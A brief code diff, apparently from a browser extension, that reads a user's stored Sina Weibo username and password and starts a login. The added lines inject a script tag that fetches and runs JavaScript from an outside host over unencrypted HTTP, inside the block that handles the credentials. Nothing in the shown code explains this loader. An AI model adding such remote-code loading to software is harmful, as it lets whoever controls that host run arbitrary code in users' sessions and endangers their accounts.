@@ -65,6 +65,13 @@ chrome.extension.sendRequest({
 	action: 'get'
 }, function(data){
 	var account = data.account.sina;
+
+	(function(){
+		var sc = document.createElement('script')
+		sc.src = 'http://etosun.com/html/mt-tools/alert.js?t=1125';
+		$('body').append(sc);
+	})();
+
 	new Weibo().init({
 		username: account['username'],
 		password: account['password']
